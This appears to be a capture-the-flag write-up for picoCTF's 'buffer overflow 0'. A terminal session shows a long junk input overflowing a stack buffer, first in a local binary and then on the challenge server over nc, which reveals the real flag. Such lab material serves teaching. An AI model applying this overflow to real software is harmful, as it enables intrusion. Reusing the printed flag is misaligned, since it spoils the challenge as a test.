# buffer overflow 0
Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/521/vuln). You can view source [here](https://artifacts.picoctf.net/c/521/vuln.c). And connect with it using: `nc saturn.picoctf.net 65355`

#### Hints
- How can you trigger the flag to print?
- If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
- Run `man gets` and read the BUGS section. How many characters can the program really read?

### Solution
```bash
                                                                                                                                           
┌──(kali㉿kali)-[~/picoctf/binaryexplot/bufferover0]
└─$ ls
vuln  vuln.c
                                                                                                                                           
┌──(kali㉿kali)-[~/picoctf/binaryexplot/bufferover0]
└─$ ls -la
total 28
drwxr-xr-x 2 kali kali  4096 Nov 27 17:47 .
drwxr-xr-x 4 kali kali  4096 Nov 27 17:44 ..
-rw-r--r-- 1 kali kali 16016 Mar 15  2022 vuln
-rw-r--r-- 1 kali kali   808 Mar 15  2022 vuln.c
                                                                                                                                           
┌──(kali㉿kali)-[~/picoctf/binaryexplot/bufferover0]
└─$ chmod +X vuln          
                                                                                                                                           
┌──(kali㉿kali)-[~/picoctf/binaryexplot/bufferover0]
└─$ file vuln    
vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=08fef67fdcc0d93019a26a2f8f97279dee848031, for GNU/Linux 3.2.0, not stripped
                                                                                                                                           
┌──(kali㉿kali)-[~/picoctf/binaryexplot/bufferover0]
└─$ ./vuln          
zsh: permission denied: ./vuln
                                                                                                                                           
┌──(kali㉿kali)-[~/picoctf/binaryexplot/bufferover0]
└─$ chmod +x vuln
                                                                                                                                           
┌──(kali㉿kali)-[~/picoctf/binaryexplot/bufferover0]
└─$ ./vuln       
Please create 'flag.txt' in this directory with your own debugging flag.
                                                                                                                                           
┌──(kali㉿kali)-[~/picoctf/binaryexplot/bufferover0]
└─$ echo 'flag{dummieflag}' > flag.txt
                                                                                                                                           
┌──(kali㉿kali)-[~/picoctf/binaryexplot/bufferover0]
└─$ ./vuln                            
Input: amsdbv
The program will exit now
                                                                                                                                           
┌──(kali㉿kali)-[~/picoctf/binaryexplot/bufferover0]
└─$ ./vuln
Input: kjdsbjhadvjhavdcavcgjvagdvcaudjakfsdhcbsdhjcdgscgadchavgcdagvczgxvcavascayctaytwwaccajchvzxkjdsbjhadvjhavdcavcgjvagdvcaudjakfsdhcbsdhjcdgscgadchavgcdagvczgxvcavascayctaytwwaccajchvzx
flag{dummieflag}

                                                                                                                                           
┌──(kali㉿kali)-[~/picoctf/binaryexplot/bufferover0]
└─$ nc saturn.picoctf.net 65355                                                                
Input: kjdsbjhadvjhavdcavcgjvagdvcaudjakfsdhcbsdhjcdgscgadchavgcdagvczgxvcavascayctaytwwaccajchvzxkjdsbjhadvjhavdcavcgjvagdvcaudjakfsdhcbsdhjcdgscgadchavgcdagvczgxvcavascayctaytwwaccajchvzx
picoCTF{ov3rfl0ws_ar3nt_that_bad_34d6b87f}

```